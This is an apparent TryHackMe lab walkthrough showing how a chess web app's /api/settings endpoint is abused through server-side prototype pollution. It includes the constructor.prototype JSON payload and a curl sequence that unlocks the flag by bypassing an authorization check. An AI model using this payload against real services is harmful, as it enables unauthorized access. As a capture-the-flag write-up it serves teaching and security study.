TryHackMe — Prototype Pollution Chess
This walkthrough describes the complete attack path for the chess application.

The room involves web application reconnaissance, HTTP request inspection with Burp Suite, identification of an authorization check, prototype pollution through a vulnerable settings endpoint, and abuse of JavaScript's prototype chain to bypass the reward restriction.

The attack begins with interacting with the chess application and examining its API requests. After identifying that the reward is controlled by session.config.unlocked, we exploit prototype pollution through /api/settings using a constructor.prototype payload.

Difficulty — Medium

MACHINE-IP: 10.113.188.132:3000

Web Application Enumeration

I started by visiting the web application provided by the scenario:

http://10.113.188.132:3000/

The application presented a chess game.

The functionality available to me included:

Resetting the chess position
Making chess moves
Saving game preferences/settings

The chess game appeared to be designed around a specific sequence of moves similar to Fool's Mate.

Rather than immediately trying to exploit the game itself, I wanted to understand how the application communicated with the backend.

I therefore opened Burp Suite and began intercepting the application's HTTP requests.

API Enumeration

While interacting with the application, I noticed several API endpoints responsible for the game's functionality.

One of the first interesting endpoints was:

POST /api/settings

This endpoint appeared to process the user's game preferences.

I also identified endpoints responsible for moving pieces and resetting the game:

POST /api/move

POST /api/reset

I began testing the application's normal functionality while watching the corresponding requests in Burp Suite.

Testing the Chess Logic

The scenario indicated that the game could be solved using a sequence similar to Fool's Mate.

I repeated the intended sequence of moves and intercepted the requests generated by the application.

The interesting request was:

POST /api/move

I was able to perform the checkmate successfully.

However, despite achieving checkmate, the application did not provide the expected reward.

The server response revealed an important clue.

The reward was being blocked because:

session.config.unlocked

was not set.

This suggested that the chess checkmate itself was not the only requirement for obtaining the reward.

There was an additional server-side authorization or state check controlling whether the reward could be returned.

At this point, session.config.unlocked became the primary target.

Resetting the Game

Because the game had ended after the checkmate, I reset the game state before continuing with further testing.

I intercepted:

POST /api/reset

The reset endpoint returned the application to its initial state.

This allowed me to continue testing without the previous game state interfering with the next attempt.

Identifying Prototype Pollution

The next step was to investigate how the application handled the JSON submitted to /api/settings.

The endpoint accepted user-controlled JSON, which immediately made prototype pollution worth testing.

In JavaScript, objects inherit properties through their prototype chain.

For example, if an object does not contain a property itself, JavaScript may look for that property on its prototype.

Conceptually:

session.config
      │
      ▼
Object.prototype
      │
      └── unlocked: true


If session.config does not have its own unlocked property, JavaScript can potentially resolve:

session.config.unlocked

from Object.prototype.

This becomes particularly dangerous when an application merges attacker-controlled JSON into objects without properly filtering dangerous properties such as:

__proto__

constructor

prototype

These properties can be abused to manipulate the JavaScript prototype chain.

Testing /api/settings

I returned to:

POST /api/settings

The endpoint accepted JSON containing the application's normal settings.

I tested whether I could include a constructor.prototype structure alongside legitimate settings.

The important portion of the payload was:

"constructor": {
  "prototype": {
    "unlocked": true
  }
}


The complete request body used during testing was:

{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180,
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  }
}


The request was accepted.

This was significant because the application appeared to be merging the supplied object into another JavaScript object without safely handling the constructor and prototype properties.

Prototype Pollution

The vulnerable behavior allowed the constructor.prototype payload to modify the shared JavaScript prototype.

The intended result was effectively:

Object.prototype.unlocked = true


The important distinction is that I did not need to directly modify:

session.config.unlocked


Instead, I polluted the prototype inherited by ordinary objects.

Therefore, if session.config was a normal JavaScript object without its own unlocked property, the following lookup could resolve successfully:

session.config.unlocked


because JavaScript would continue up the prototype chain:

session.config
     │
     │ property not found
     ▼
Object.prototype
     │
     │ unlocked = true
     ▼
true


This effectively turned the previously blocked reward condition into a satisfied condition.

Triggering the Reward

With the prototype polluted, I performed the chess checkmate sequence again.

The final move was sent to:

POST /api/move

The important part was that this request was made using the same application session.

When the server checked:

session.config.unlocked


the property resolved to:

true

through the polluted prototype chain.

The application therefore considered the session unlocked.

The checkmate move was accepted and the reward/flag was returned.

Recreating the Exploit with cURL

After confirming the vulnerability through Burp Suite, I recreated the attack using cURL.

I used a cookie jar so that the same session was maintained between the reset, prototype-pollution, and move requests.

I first defined the target:

target=10.113.188.132:3000

Step 1 — Reset the Session

First, I reset the game session.

The -c option saves cookies to cookies.txt, while -b sends the cookies stored in that file.

curl -s -c cookies.txt -b cookies.txt \
-X POST http://$target/api/reset \
-H "Content-Length: 0" >/dev/null


This gave me a clean game state while establishing the cookie jar that would be reused for the following requests.

Step 2 — Pollute the Prototype

Next, I sent a request to:

POST /api/settings

I included normal-looking game settings along with the prototype-pollution payload.

curl -s -c cookies.txt -b cookies.txt \
-X POST http://$target/api/settings \
-H "Content-Type: application/json" \
-d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}'


The important section is:

"constructor": {
  "prototype": {
    "unlocked": true
  }
}


This exploits the vulnerable object merge performed by the application.

The intended effect is to pollute Object.prototype with:

unlocked: true


As a result, objects that do not explicitly define unlocked can inherit the property.

This includes the application's:

session.config


object.

Step 3 — Perform the Checkmate Move

Finally, I sent the checkmate move to:

POST /api/move

Again, I reused the same cookie jar to maintain the session.

curl -s -c cookies.txt -b cookies.txt \
-X POST http://$target/api/move \
-H "Content-Type: application/json" \
-d '{"from":"a1","to":"a8"}'


The server evaluated the move and then checked the reward condition.

Previously:

session.config.unlocked


resolved to an unset value.

After the prototype pollution:

session.config.unlocked


resolved to:

true


because the property was inherited through the polluted Object.prototype.

The application therefore considered the reward unlocked and returned the flag.

Vulnerability Classification

The primary vulnerability demonstrated by the application is:

Server-Side Prototype Pollution

The prototype pollution then results in an:

Authorization / Access-Control Bypass

The relevant CWE classification is:

CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

The vulnerable behavior occurs because attacker-controlled JSON containing prototype-related properties is accepted and merged without adequate sanitization.

The dangerous payload is:

{
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  }
}


The core security issue is not the chess logic itself. The chess game simply provides the condition needed to reach the reward functionality.

The actual vulnerability is the ability to manipulate the JavaScript prototype chain and make a security-sensitive property appear to be enabled.
